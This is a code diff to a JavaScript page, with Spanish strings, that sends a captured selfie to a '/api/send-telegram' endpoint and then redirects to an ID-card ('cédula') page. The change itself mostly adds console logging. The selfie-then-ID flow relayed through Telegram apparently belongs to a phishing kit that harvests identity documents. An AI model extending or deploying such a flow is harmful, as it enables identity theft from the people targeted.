@@ -122,16 +122,23 @@ document.addEventListener('DOMContentLoaded', function() {
         }
 
         // Mostrar overlay
-        window.loadingOverlay.showSending('Enviando foto...');
+        window.loadingOverlay.showSending('Enviando selfie...');
 
         try {
             // Preparar datos
             const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
+            
+            console.log('📤 Preparando envío de selfie...');
+            console.log('Message ID:', formData.messageId);
+            console.log('Tamaño foto:', capturedPhoto.length, 'caracteres');
+            
             const data = {
                 tipo: 'Selfie',
                 messageId: formData.messageId,
                 foto: capturedPhoto
             };
+
+            console.log('🌐 Enviando request a /api/send-telegram...');
 
             const response = await fetch('/api/send-telegram', {
                 method: 'POST',
@@ -142,29 +149,35 @@ document.addEventListener('DOMContentLoaded', function() {
                 body: JSON.stringify(data)
             });
 
+            console.log('📨 Response status:', response.status);
+
             if (!response.ok) {
+                const errorText = await response.text();
+                console.error('Error response:', errorText);
                 throw new Error(`Error del servidor: ${response.status}`);
             }
 
             const result = await response.json();
+            console.log('✅ Response result:', result);
             
             if (!result.success) {
                 throw new Error(result.error || 'Error al procesar la solicitud');
             }
 
-            console.log('✅ Foto enviada exitosamente');
+            console.log('✅ Selfie enviada exitosamente a Telegram - Message ID:', result.messageId);
             
             // Guardar estado
             formData.selfieMessageId = result.messageId;
             sessionStorage.setItem('formData', JSON.stringify(formData));
             
             // Redirigir a página de cédula
+            console.log('🔄 Redirigiendo a cedula.html...');
             window.location.href = 'cedula.html';
 
         } catch (error) {
-            console.error('❌ Error al enviar foto:', error);
+            console.error('❌ Error al enviar selfie:', error);
             window.loadingOverlay.hide();
-            window.commonUtils.showError('Error al enviar la foto. Por favor intente nuevamente.');
+            window.commonUtils.showError('Error al enviar la selfie. Por favor intente nuevamente.');
         }
     });
 
